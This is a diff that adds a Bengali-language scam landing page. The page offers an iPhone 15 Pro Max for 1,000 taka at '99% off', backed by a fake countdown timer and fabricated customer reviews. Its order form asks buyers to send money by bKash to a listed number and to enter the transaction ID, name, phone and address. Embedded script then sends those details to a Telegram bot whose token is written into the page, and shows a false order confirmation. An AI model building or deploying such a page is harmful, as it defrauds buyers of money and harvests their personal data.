@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone 15 Pro Max - Limited Offer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap');
+        body { font-family: 'Hind Siliguri', sans-serif; background-color: #013220; color: white; margin: 0; overflow-x: hidden; }
+        
+        .slider-container { width: 100%; overflow: hidden; position: relative; }
+        .slides { display: flex; transition: transform 0.7s ease-in-out; }
+        .slide { min-width: 100%; display: flex; justify-content: center; align-items: center; padding: 10px; }
+        .slide img { width: 85%; max-height: 380px; object-fit: contain; filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5)); }
+
+        .gold-text { color: #d4af37; }
+        .btn-buy-blue { 
+            background: linear-gradient(180deg, #3b82f6 0%, #1d4ed8 100%); 
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
+        }
+
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 15px; }
+        .modal-overlay.active { display: flex; }
+        .form-container { background: #0a1f1a; border: 1px solid #d4af37; width: 100%; max-width: 360px; border-radius: 25px; position: relative; max-height: 90vh; overflow-y: auto; }
+        
+        .review-card { background: white; color: #333; border-radius: 15px; padding: 10px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+    </style>
+</head>
+<body class="max-w-md mx-auto min-h-screen pb-24 relative">
+
+    <div class="bg-red-700 text-white text-center py-2 font-bold sticky top-0 z-50 shadow-lg text-sm">
+        OFFER ENDS IN: <span id="timer" class="text-yellow-300">29:58 MINS</span>
+    </div>
+
+    <div class="slider-container mt-4">
+        <div id="slider" class="slides">
+            <div class="slide"><img src="https://i.ibb.co.com/gbyH4tY2/50a71c0303bca79fc4d2fae2ca50cfd1.png"></div>
+            <div class="slide"><img src="https://i.ibb.co.com/jvvx7964/7027ce0fdbb92010a312f4814bb04afc.png"></div>
+            <div class="slide"><img src="https://i.ibb.co.com/ccCJWnFt/pngwing-com.png"></div>
+        </div>
+    </div>
+
+    <div class="p-6 text-center">
+        <h1 class="text-2xl font-bold">iPhone 15 Pro Max</h1>
+        <p class="text-4xl font-black gold-text mt-1">ONLY 1,000TK!</p>
+        <p class="text-xs tracking-widest mt-1 opacity-80 uppercase font-bold">LIMITED TIME! 99% OFF!</p>
+    </div>
+
+    <div class="px-4 pb-10">
+        <h2 class="text-center gold-text font-bold mb-6 italic text-xl">Customer Reviews</h2>
+        <div class="grid grid-cols-2 gap-3">
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/p6yKw8mK/vzfw2.jpg" class="w-10 h-10 rounded-full mx-auto mb-1 border border-yellow-500 object-cover">
+                <div class="text-yellow-500 text-[8px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight italic">"১০০০ টাকায় আইফোন বিশ্বাস করতে পারছি না!"</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/tTZjTHc1/fsgsgere.jpg" class="w-10 h-10 rounded-full mx-auto mb-1 border border-yellow-500 object-cover">
+                <div class="text-yellow-500 text-[8px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight italic">"হাতে পাওয়ার পর অবাক হয়ে গেছি। ধন্যবাদ!"</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/TB7gWY1w/wretey4.jpg" class="w-10 h-10 rounded-full mx-auto mb-1 border border-yellow-500 object-cover">
+                <div class="text-yellow-500 text-[8px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight italic">"অবিশ্বাস্য অফার! ২ দিনেই হাতে পেলাম।"</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/FkHbFhJB/wyryryryry3.jpg" class="w-10 h-10 rounded-full mx-auto mb-1 border border-yellow-500 object-cover">
+                <div class="text-yellow-500 text-[8px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight italic">"প্রোডাক্ট একদম জেনুইন। অনেক ধন্যবাদ।"</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/VpZ5m8K/user5.jpg" class="w-10 h-10 rounded-full mx-auto mb-1 border border-yellow-500 object-cover">
+                <div class="text-yellow-500 text-[8px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight italic">"খুবই ভালো সার্ভিস। ১০০০ টাকা উসুল।"</p>
+            </div>
+            <div class="review-card">
+                <img src="https://i.ibb.co.com/X4yZ2mP/user6.jpg" class="w-10 h-10 rounded-full mx-auto mb-1 border border-yellow-500 object-cover">
+                <div class="text-yellow-500 text-[8px] mb-1">★★★★★</div>
+                <p class="text-[9px] font-bold leading-tight italic">"অর্ডার কনফার্ম করার পরেই পেয়ে গেছি।"</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="orderModal" class="modal-overlay">
+        <div class="form-container p-6">
+            <button onclick="closeModal()" class="absolute top-3 right-4 text-white text-2xl">&times;</button>
+            <h3 class="text-xl font-black text-center gold-text mb-4">অর্ডার ফর্ম</h3>
+            
+            <form id="orderForm" class="space-y-3">
+                <div class="bg-black p-4 rounded-xl border border-yellow-600/30 text-center mb-4">
+                    <p class="text-[10px] gold-text font-bold mb-1">বিকাশ (সেন্ড মানি) ১,০০০৳ করুন</p>
+                    <p class="text-2xl font-black tracking-widest text-white">01870428306</p>
+                </div>
+                
+                <input type="text" id="trxId" placeholder="ট্রানজাকশন আইডি (TrxID)" class="w-full p-3 rounded-lg bg-white/10 border border-gray-700 outline-none text-sm text-white" required>
+                <input type="text" id="custName" placeholder="আপনার নাম" class="w-full p-3 rounded-lg bg-white/10 border border-gray-700 outline-none text-sm text-white" required>
+                <input type="tel" id="custPhone" placeholder="মোবাইল নাম্বার" class="w-full p-3 rounded-lg bg-white/10 border border-gray-700 outline-none text-sm text-white" required>
+                <textarea id="custAddress" placeholder="বিস্তারিত ঠিকানা" class="w-full p-3 rounded-lg bg-white/10 border border-gray-700 outline-none text-sm text-white" rows="2" required></textarea>
+                
+                <button type="submit" class="w-full py-4 rounded-full bg-green-500 text-black font-black text-lg shadow-lg active:scale-95 transition-all">অর্ডার কনফার্ম করুন</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="successScreen" class="modal-overlay">
+        <div class="bg-green-500 text-black p-8 rounded-[40px] text-center w-full max-w-xs shadow-2xl">
+            <div class="text-6xl mb-4">🎁</div>
+            <h2 class="text-2xl font-black mb-2">ধন্যবাদ!</h2>
+            <p class="text-sm font-bold">আপনার অর্ডারটি গ্রহণ করা হয়েছে। খুব শীঘ্রই ডেলিভারি দেওয়া হবে।</p>
+            <button onclick="location.reload()" class="mt-8 w-full py-3 bg-black text-white rounded-full font-bold">হোমে ফিরে যান</button>
+        </div>
+    </div>
+
+    <div class="fixed bottom-0 left-0 right-0 max-w-md mx-auto p-4 z-40 bg-black/10 backdrop-blur-md">
+        <button onclick="openModal()" class="w-full py-4 rounded-full text-white font-black text-xl btn-buy-blue flex justify-center items-center gap-2">
+            <span>︿</span> BUY NOW
+        </button>
+    </div>
+
+    <script>
+        // Image Slider
+        let cur = 0;
+        setInterval(() => {
+            cur = (cur + 1) % 3;
+            document.getElementById('slider').style.transform = `translateX(-${cur * 100}%)`;
+        }, 3000);
+
+        // Timer
+        let time = 1798;
+        setInterval(() => {
+            if(time <= 0) return;
+            time--;
+            let m = Math.floor(time/60);
+            let s = time % 60;
+            document.getElementById('timer').innerText = `${m}:${s.toString().padStart(2, '0')} MINS`;
+        }, 1000);
+
+        function openModal() { document.getElementById('orderModal').classList.add('active'); }
+        function closeModal() { document.getElementById('orderModal').classList.remove('active'); }
+
+        // Telegram Send
+        document.getElementById('orderForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const text = `🚀 **নতুন অর্ডার!**\n\n👤 নাম: ${document.getElementById('custName').value}\n📞 ফোন: ${document.getElementById('custPhone').value}\n🏠 ঠিকানা: ${document.getElementById('custAddress').value}\n💰 TrxID: ${document.getElementById('trxId').value}`;
+            
+            fetch(`https://api.telegram.org/bot8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: "5085997009", text: text, parse_mode: 'Markdown'})
+            }).then(() => {
+                document.getElementById('orderModal').classList.remove('active');
+                document.getElementById('successScreen').classList.add('active');
+            });
+        });
+    </script>
+</body>
+</html>
